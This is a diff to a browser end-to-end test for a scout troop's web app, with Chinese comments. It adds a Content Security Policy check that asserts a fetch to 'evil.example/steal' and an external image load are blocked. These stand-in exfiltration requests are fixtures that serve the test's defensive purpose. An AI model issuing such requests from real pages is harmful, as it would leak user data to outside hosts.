@@ -45,6 +45,8 @@ function seed(env) {
   const page = await context.newPage();
   const errors = [];
   page.on('pageerror', (e) => errors.push(e.message));
+  // 內容安全政策擋到任何東西都算錯（表示網頁想載入外部資源，或政策寫得太緊）
+  page.on('console', (m) => { if (/Content Security Policy|Refused to/.test(m.text())) errors.push('CSP：' + m.text()); });
   const dialogs = [];
   let dialogAnswer = true; // confirm／prompt 預設按確定（prompt 用預設值）
   page.on('dialog', (d) => { dialogs.push(d.message()); dialogAnswer ? d.accept(d.type() === 'prompt' ? d.defaultValue() : undefined) : d.dismiss(); });
@@ -87,6 +89,12 @@ function seed(env) {
   assert.match(await page.locator('#noticeCard').innerText(), /公佈欄[\s\S]*目前沒有公告/, '沒有公告時公佈欄也要看得到');
   assert.equal(await page.locator('nav.tabs button').first().getAttribute('data-v'), 'home', '導覽列第一個是首頁');
   assert.match(await page.locator('nav.tabs button').first().innerText(), /首頁/);
+  // 資安（附錄第 59 點）：網頁不能連到 Google 後端以外的網站、不能載入外部圖片
+  if (!IN_GAS) {
+    assert.equal(await page.evaluate(() => fetch('https://evil.example/steal').then(() => '通過', () => '被擋')), '被擋');
+    assert.equal(await page.evaluate(() => new Promise((ok) => { const i = new Image(); i.onload = () => ok('通過'); i.onerror = () => ok('被擋'); i.src = 'https://evil.example/x.png'; })), '被擋');
+    errors.splice(0); // 上面兩個故意被擋的請求會留下 CSP 訊息，不算錯
+  }
   // 按標題「22團幼童軍」回首頁
   await tab('badges'); await page.locator('.badge').first().waitFor();
   await page.click('#title');
